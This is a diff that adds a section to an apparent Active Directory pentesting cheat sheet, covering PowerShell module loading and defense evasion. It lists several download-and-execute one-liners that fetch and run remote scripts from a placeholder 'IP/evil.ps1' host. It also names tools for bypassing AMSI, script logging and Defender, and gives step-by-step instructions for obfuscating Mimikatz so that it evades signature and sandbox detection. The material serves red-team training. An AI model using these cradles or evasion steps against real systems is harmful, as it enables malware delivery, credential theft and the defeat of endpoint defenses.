@@ -6509,6 +6509,47 @@ When you compromise a Domain Controller, you want to be able to get the ntds.dit
 - Make user change password next logon
   - `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose`
 
+**Work with modules and scripts**
+
+Import a `.psd1` script (get all the commands from a module with `Get-Command -module <name-module>`)
+- `Import-Module script.psd1`
+- `iex (New-Object Net.WebClient).DownloadString('https://IP/payload.ps1')`
+- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://IP/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
+- PSv3 onwards: `iex(iwr 'http://IP/evil.ps1')`
+- `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://IP/evil.ps1',$false);$h.send();iex $h.responseText`
+- `$wr = [System.NET.WebRequest]::Create("http://IP/evil.ps1")`<br/>
+  `$r = $wr.GetResponse()`<br/>
+  `IEX (System.IO.StreamReader).ReadToEnd()`
+
+PowerShell Detections
+- System-wide transcription
+- Script Block logging
+- AntiMalware Scan Interface (AMSI)
+- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)
+
+PowerShell Detections bypass
+- Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
+- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected as malicious: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
+- [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag: `DefenderCheck.exe PowerUp.ps1`
+- For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+
+Steps to avoid signature based detection:
+1. Scan using AMSITrigger
+2. Modify the detected code snippet
+3. Rescan using AMSITrigger
+4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"
+
+For Mimikatz, make the following changes:
+1. Remove default comments
+2. Rename the script, function names and variables
+3. Modify the variable names of the Win32 API calls that are detected
+4. Obfuscate PEBytes content → PowerKatz dll using packers (tool: [ProtectMyTooling](https://github.com/mgeeky/ProtectMyTooling))
+5. Implement a reverse function for PEBytes to avoid any static signatures
+6. Add a sandbox check to waste dynamic analysis resources
+7. Remove Reflective PE warnings for a clean output
+8. Use obfuscated commands for Invoke-MimiEx execution
+9. Analysis using DefenderCheck
+
 
 #### <ins>Initial foothold</ins>
 - run `responder` + `mitm6`
